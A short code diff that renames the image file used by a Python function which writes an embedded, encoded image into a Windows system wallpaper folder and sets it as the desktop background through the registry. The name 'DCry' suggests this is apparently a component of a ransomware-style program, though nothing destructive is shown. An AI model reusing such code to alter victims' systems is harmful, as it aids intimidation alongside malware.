@@ -282,7 +282,7 @@ def change_wallpaper():
     DpwFo5BWLJVEHNVVkNE1WhF3vOHn3C7gSDRWQySMkfEogcZDgMI4efvf89/z3/P//pN174us6aWQ
     Sakft2B3ainWDlbZK3wO/R95uEth
     """
-    with open(r"C:\windows\web\wallpaper\windows\DCRY.png", "wb") as f:
+    with open(r"C:\windows\web\wallpaper\windows\DCry.png", "wb") as f:
         f.write(zlib.decompress(base64.b64decode(encoded_image.encode())))
     reg_path = r"Control Panel\Desktop"
     with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as reg:
@@ -291,7 +291,7 @@ def change_wallpaper():
             "Wallpaper",
             0,
             winreg.REG_SZ,
-            r"C:\windows\web\wallpaper\windows\DCRY.png",
+            r"C:\windows\web\wallpaper\windows\DCry.png",
         )
 
 
